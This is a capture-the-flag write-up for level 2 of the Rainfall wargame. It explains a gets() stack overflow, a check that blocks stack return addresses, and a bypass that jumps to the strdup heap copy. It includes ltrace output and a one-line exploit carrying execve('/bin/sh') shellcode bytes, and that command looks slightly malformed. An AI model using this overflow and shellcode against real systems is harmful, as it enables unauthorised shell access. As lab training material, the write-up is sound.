# Rainfall - Level 2

## Executable Analyse

As in the previous exercise, there are two functions: `p` called by the `main` and using the buffer overflow vulnerable function `gets`.  

The difficulty here is the following condition `if ((unaff_retaddr & 0xb0000000) == 0xb0000000)` which checks if the EIP address starts with `0xb` (meaning it's on the stack).  

## Writing shellcode on heap

Like in previous level we found the buffer overflow at position 80.

The `ltrace` command gives us the return and input addresses of libc function :  
```shell
$> ltrace ./level2

gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5)                                             = 0xbffff70c
puts("")                                                                                  = 1
strdup("")                                                                                = 0x0804a008
```


Our strategy attack is to write a shellcode (execv("/bin/sh")) in buffer passing to gets() function.  
Using libc execv() addr will overflow with 0xb00.. address and let program fall in the exit condition.
But in order to bypass the 0xb0 condition, we need to rewrite eip with the strdup return addr.


```shell
(python -c "print  + b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + b'a' * (80 - 45) + b'\x08\xa0\x04\x08'" ; cat) | ./level2
```

x86 Shellcode found on : https://beta.hackndo.com/buffer-overflow/